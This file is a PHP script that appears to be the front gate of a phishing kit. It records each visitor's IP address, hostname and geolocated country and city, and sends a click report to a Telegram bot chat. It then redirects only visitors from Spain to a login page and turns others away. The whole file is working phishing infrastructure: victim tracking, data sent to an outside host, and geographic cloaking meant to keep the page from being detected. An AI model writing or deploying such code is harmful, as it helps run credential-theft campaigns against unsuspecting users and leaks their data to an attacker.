<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country;
$CITY    = $IP_LOOKUP->city;
$message = "CLICK From* #$COUNTRY   : $ip & $hostname \n";
$token = "uhh";
$data = [
    'text' => $message,
    'chat_id' => '-423566669482'
];

if ($COUNTRY === "Spain") {
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location:login.php");
} else { echo "Link Work Only In Spain";}
